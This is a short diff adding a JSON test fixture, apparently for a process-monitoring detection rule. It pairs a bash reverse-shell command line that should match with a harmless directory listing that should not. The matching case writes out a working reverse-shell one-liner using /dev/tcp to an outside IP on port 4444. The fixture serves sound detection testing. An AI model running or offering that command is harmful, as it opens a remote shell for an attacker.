@@ -1,0 +1,14 @@
+{
+  "should_match": [
+    {
+      "Image": "/bin/bash",
+      "CommandLine": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"
+    }
+  ],
+  "should_not_match": [
+    {
+      "Image": "/bin/bash",
+      "CommandLine": "bash -c 'ls -la /var/log'"
+    }
+  ]
+}
